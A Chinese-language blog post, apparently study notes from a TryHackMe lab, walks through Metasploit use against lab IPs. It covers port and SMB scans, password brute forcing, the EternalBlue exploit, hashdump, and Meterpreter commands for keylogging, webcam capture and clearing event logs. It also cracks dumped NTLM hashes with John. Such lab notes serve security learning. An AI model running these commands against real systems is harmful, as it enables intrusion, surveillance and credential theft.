@@ -1,0 +1,482 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="Metasploit 是使用最广泛的开发框架。Metasploit 是一个强大的工具，可以支持渗透测试参与的所有阶段，从信息收集到利用后。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Metasploit">
+<meta property="og:url" content="http://example.com/2022/05/28/Metasploit/index.html">
+<meta property="og:site_name" content="SugarCrash!">
+<meta property="og:description" content="Metasploit 是使用最广泛的开发框架。Metasploit 是一个强大的工具，可以支持渗透测试参与的所有阶段，从信息收集到利用后。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/h9yQXUNFd5Zkm7G.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/SPfCLAhxs3qDgYX.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/rJiGlgE9Fa5jRtN.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/gsiZkbXIUxl7tqf.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/GikVJtxfW3ATHdB.png">
+<meta property="article:published_time" content="2022-05-28T03:58:25.000Z">
+<meta property="article:modified_time" content="2022-05-29T03:08:38.020Z">
+<meta property="article:author" content="Lu1i丶">
+<meta property="article:tag" content="Tryhackme">
+<meta property="article:tag" content="工具使用">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2022/05/18/h9yQXUNFd5Zkm7G.png">
+
+<link rel="canonical" href="http://example.com/2022/05/28/Metasploit/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Metasploit | SugarCrash!</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">SugarCrash!</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">记录学习，想找个师傅带带我</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/28/Metasploit/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.PNG">
+      <meta itemprop="name" content="Lu1i丶">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="SugarCrash!">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Metasploit
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-05-28 11:58:25" itemprop="dateCreated datePublished" datetime="2022-05-28T11:58:25+08:00">2022-05-28</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-05-29 11:08:38" itemprop="dateModified" datetime="2022-05-29T11:08:38+08:00">2022-05-29</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Tryhackme/" itemprop="url" rel="index"><span itemprop="name">Tryhackme</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Tryhackme/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" itemprop="url" rel="index"><span itemprop="name">工具使用</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>Metasploit 是使用最广泛的开发框架。Metasploit 是一个强大的工具，可以支持渗透测试参与的所有阶段，从信息收集到利用后。</p>
+<span id="more"></span>
+<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search portscan</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/05/18/h9yQXUNFd5Zkm7G.png" alt="202205181148119.png"></p>
+<h3 id="netbios名称模块"><a href="#netbios名称模块" class="headerlink" title="netbios名称模块"></a>netbios名称模块</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">search netbios </span><br><span class="line">use auxiliary/scanner/netbios/nbname </span><br><span class="line">show options </span><br><span class="line">set rhosts 10.10.113.98</span><br></pre></td></tr></table></figure>
+<h3 id="查看http开的是什么服务"><a href="#查看http开的是什么服务" class="headerlink" title="查看http开的是什么服务"></a>查看http开的是什么服务</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/http/http_version </span><br><span class="line">set rhosts 10.10.113.98 </span><br><span class="line">set rport 8000 </span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/05/18/SPfCLAhxs3qDgYX.png" alt="202205181148120.png"></p>
+<h3 id="使用smb爆破"><a href="#使用smb爆破" class="headerlink" title="使用smb爆破"></a>使用smb爆破</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_version </span><br><span class="line">show options </span><br><span class="line">set SMBUser penny </span><br><span class="line">set DB_ALL_PASS true </span><br><span class="line">set PASS_FILE MetasploitWordlist.txt </span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/05/18/rJiGlgE9Fa5jRtN.png" alt="202205181148121.png"></p>
+<h3 id="开发"><a href="#开发" class="headerlink" title="开发"></a>开发</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; setg RHOSTS 10.10.215.124 设置全局的rhosts </span><br><span class="line">search eternalblue </span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue </span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/05/18/gsiZkbXIUxl7tqf.png" alt="202205181148122.png"></p>
+<h3 id="hash破解"><a href="#hash破解" class="headerlink" title="hash破解"></a>hash破解</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">background 挂载会话 </span><br><span class="line">sessions 看会话 </span><br><span class="line">search hashdump </span><br><span class="line">use post/windows/gather/hashdump </span><br><span class="line">show options </span><br><span class="line">set session 1 </span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/05/18/GikVJtxfW3ATHdB.png" alt="202205181148123.png"></p>
+<p>###Meterpreter如何工作的<br>Meterpreter在内存中允许，并且不会将自身写入目标上的磁盘，防止病毒扫描工具扫描磁盘，他在RAM中运行，并且Meterpreter 还通过与运行 Metasploit 的服务器（通常是您的攻击机器）进行加密通信，避免被基于网络的 IPS（入侵防御系统）和 IDS（入侵检测系统）解决方案检测到。如果目标组织不解密和检查进出本地网络的加密流量（例如 HTTPS），IPS 和 IDS 解决方案将无法检测到其活动。</p>
+<p>Meterpreter 命令核心命令将有助于导航和与目标系统交互。下面是一些最常用的。一旦 Meterpreter 会话开始，请记住检查运行帮助命令的所有可用命令。</p>
+<h4 id="核心命令"><a href="#核心命令" class="headerlink" title="核心命令"></a>核心命令</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">background：背景当前会话 </span><br><span class="line">exit: 终止 Meterpreter 会话 </span><br><span class="line">guid：获取会话 GUID（全局唯一标识符） </span><br><span class="line">help：显示帮助菜单 </span><br><span class="line">info：显示有关 Post 模块的信息 </span><br><span class="line">irb: 在当前会话中打开一个交互式 Ruby shell </span><br><span class="line">load: 加载一个或多个 Meterpreter 扩展 </span><br><span class="line">migrate：允许您将 Meterpreter 迁移到另一个进程 </span><br><span class="line">run: 执行 Meterpreter 脚本或 Post 模块 </span><br><span class="line">sessions：快速切换到另一个会话</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h4 id="文件系统命令"><a href="#文件系统命令" class="headerlink" title="文件系统命令"></a>文件系统命令</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd: 将改变目录 </span><br><span class="line">ls：将列出当前目录中的文件（dir 也可以） </span><br><span class="line">pwd：打印当前工作目录 </span><br><span class="line">edit: 将允许您编辑文件 </span><br><span class="line">cat：将文件的内容显示到屏幕上 </span><br><span class="line">rm: 将删除指定文件 search: 将搜索文件 </span><br><span class="line">upload: 将上传文件或目录 </span><br><span class="line">download: 将下载文件或目录</span><br></pre></td></tr></table></figure>
+<h4 id="联网命令"><a href="#联网命令" class="headerlink" title="联网命令"></a>联网命令</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">arp：显示主机 ARP（地址解析协议）缓存 </span><br><span class="line">ifconfig：显示目标系统上可用的网络接口 </span><br><span class="line">netstat：显示网络连接 </span><br><span class="line">portfwd: 将本地端口转发到远程服务 </span><br><span class="line">route：允许您查看和修改路由表</span><br></pre></td></tr></table></figure>
+<h4 id="系统命令"><a href="#系统命令" class="headerlink" title="系统命令"></a>系统命令</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">clearev：清除事件日志 </span><br><span class="line">execute: 执行命令 </span><br><span class="line">getpid：显示当前进程标识符 </span><br><span class="line">getuid：向用户显示 Meterpreter 正在运行 </span><br><span class="line">kill: 终止进程 pkill: 按名称终止进程 </span><br><span class="line">ps: 列出正在运行的进程 </span><br><span class="line">reboot：重新启动远程计算机 </span><br><span class="line">shell: 进入系统命令外壳 </span><br><span class="line">shutdown：关闭远程计算机 </span><br><span class="line">sysinfo：获取有关远程系统的信息，例如操作系统</span><br></pre></td></tr></table></figure>
+<h4 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h4><p>这些将在帮助菜单的不同菜单类别下列出</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">idletime: 返回远程用户空闲的秒数 </span><br><span class="line">keyscan_dump：转储击键缓冲区 </span><br><span class="line">keyscan_start: 开始捕捉击键 </span><br><span class="line">keyscan_stop：停止捕获击键 </span><br><span class="line">screenshare：允许您实时观看远程用户的桌面 </span><br><span class="line">screenshot：抓取交互式桌面的屏幕截图 </span><br><span class="line">record_mic：从默认麦克风录制音频 X 秒 </span><br><span class="line">webcam_chat：开始视频聊天 </span><br><span class="line">webcam_list：列出网络摄像头 </span><br><span class="line">webcam_snap：从指定的网络摄像头拍摄快照 </span><br><span class="line">webcam_stream：播放来自指定网络摄像头的视频流 </span><br><span class="line">getsystem: 尝试将您的权限提升到本地系统的权限 </span><br><span class="line">hashdump: 转储 SAM 数据库的内容</span><br></pre></td></tr></table></figure>
+<h4 id="进程迁移"><a href="#进程迁移" class="headerlink" title="进程迁移"></a>进程迁移</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt;tasklist /m /fi &quot;pid eq 进程号&quot;</span><br><span class="line">查看进程的动态链接库</span><br></pre></td></tr></table></figure>
+<h4 id="hash转储"><a href="#hash转储" class="headerlink" title="hash转储"></a>hash转储</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; hashdump Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d::: meterpreter &gt;</span><br></pre></td></tr></table></figure>
+<h4 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">meterpreter &gt; search -f flag2.txt </span><br><span class="line">Found 1 result... </span><br><span class="line">	c:\Windows\System32\config\flag2.txt (34 bytes) </span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
+<h4 id="John或Hashcat破解NTLMhash"><a href="#John或Hashcat破解NTLMhash" class="headerlink" title="John或Hashcat破解NTLMhash"></a>John或Hashcat破解NTLMhash</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ip-10-10-196-135:~/Desktop/msmeterpreter# cat hash2.txt 69596c7aa1e8daee17f8e78870e25a5c </span><br><span class="line">root@ip-10-10-196-135:~/Desktop/msmeterpreter# john --format=NT --rules -w=/usr/share/wordlists/rockyou.txt hash2.txtUsing default input encoding: UTF-8 Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3]) Warning: no OpenMP support for this hash type, consider --fork=2 Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status Trustno1  (?) 1g 0:00:00:01 DONE (2021-09-26 13:58) 0.9090g/s 46778p/s 46778c/s 46778C/s blackrose1..2pac4ever Use the &quot;--show --format=NT&quot; options to display all of the cracked passwords reliably Session completed.</span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Tryhackme/" rel="tag"># Tryhackme</a>
+              <a href="/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" rel="tag"># 工具使用</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/05/28/Shell/" rel="prev" title="Shell">
+      <i class="fa fa-chevron-left"></i> Shell
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/05/28/Linux%E6%8F%90%E6%9D%83/" rel="next" title="Linux提权">
+      Linux提权 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">1.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#netbios%E5%90%8D%E7%A7%B0%E6%A8%A1%E5%9D%97"><span class="nav-number">2.</span> <span class="nav-text">netbios名称模块</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8Bhttp%E5%BC%80%E7%9A%84%E6%98%AF%E4%BB%80%E4%B9%88%E6%9C%8D%E5%8A%A1"><span class="nav-number">3.</span> <span class="nav-text">查看http开的是什么服务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8smb%E7%88%86%E7%A0%B4"><span class="nav-number">4.</span> <span class="nav-text">使用smb爆破</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%80%E5%8F%91"><span class="nav-number">5.</span> <span class="nav-text">开发</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hash%E7%A0%B4%E8%A7%A3"><span class="nav-number">6.</span> <span class="nav-text">hash破解</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A0%B8%E5%BF%83%E5%91%BD%E4%BB%A4"><span class="nav-number">6.1.</span> <span class="nav-text">核心命令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="nav-number">6.2.</span> <span class="nav-text">文件系统命令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%81%94%E7%BD%91%E5%91%BD%E4%BB%A4"><span class="nav-number">6.3.</span> <span class="nav-text">联网命令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="nav-number">6.4.</span> <span class="nav-text">系统命令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E5%91%BD%E4%BB%A4"><span class="nav-number">6.5.</span> <span class="nav-text">其他命令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%9B%E7%A8%8B%E8%BF%81%E7%A7%BB"><span class="nav-number">6.6.</span> <span class="nav-text">进程迁移</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#hash%E8%BD%AC%E5%82%A8"><span class="nav-number">6.7.</span> <span class="nav-text">hash转储</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%90%9C%E7%B4%A2"><span class="nav-number">6.8.</span> <span class="nav-text">搜索</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#John%E6%88%96Hashcat%E7%A0%B4%E8%A7%A3NTLMhash"><span class="nav-number">6.9.</span> <span class="nav-text">John或Hashcat破解NTLMhash</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Lu1i丶"
+      src="/images/1.PNG">
+  <p class="site-author-name" itemprop="name">Lu1i丶</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">5</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Lu1i丶</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
